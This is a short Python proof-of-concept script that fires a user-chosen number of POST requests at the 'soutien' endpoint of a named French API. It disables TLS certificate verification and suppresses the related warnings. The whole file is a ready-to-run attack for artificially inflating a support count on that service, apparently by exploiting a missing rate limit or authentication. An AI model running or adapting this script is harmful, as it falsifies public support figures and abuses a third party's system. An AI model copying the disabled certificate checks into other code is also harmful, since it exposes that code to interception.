import requests
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

API_URL = "https://api.gj-france.fr/"


def addSupport(numberSupport):
    for _ in range(numberSupport):
        requests.post(API_URL + "soutien", verify=False)


def main():
    if len(sys.argv) > 1:
        addSupport(int(sys.argv[1]))
    else:
        print('Usage: python3 poc.py [number_of_support_to_add]')


if __name__ == '__main__':
    main()
